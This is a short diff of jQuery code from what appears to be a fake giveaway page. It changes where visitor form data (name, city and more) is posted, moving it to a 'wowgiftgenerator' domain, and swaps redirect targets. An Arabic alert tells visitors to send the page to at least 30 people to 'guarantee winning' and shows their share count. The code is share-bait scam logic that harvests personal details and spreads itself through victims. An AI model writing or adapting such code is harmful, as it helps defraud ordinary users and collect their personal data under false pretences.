@@ -94,7 +94,7 @@ $(document).ready(function () {
 		} else {
 
 			$.ajax({
-				url: "http://asrar4u.com/rashd/save.php",
+				url: "https://comp.wowgiftgenerator.com/save.php",
 				data: {
 					name: $("#nameform").val(),
 					city: $("#cityform").val(),
@@ -286,14 +286,14 @@ $(document).ready(function () {
 			if (c > 1) {
 				$(this)
 					.attr({
-						href: "https://comp.wowgiftgenerator.com/ar.html",
+						href: "yahoo.com",
 						target: "_self"
 					});
 			}
 		});
 	$("#b2")
 		.on('click', function () {
-			if (c > 1) window.location = "https://comp.wowgiftgenerator.com/ar.html";
+			if (c > 1) window.location = "bing.com";
 			else window.alert(" من فضلك أرسل إلى 30 شخص على الأقل لضمان الربح ! \n\n المشاركات التي قمت بها  " + c);
 		});
 });
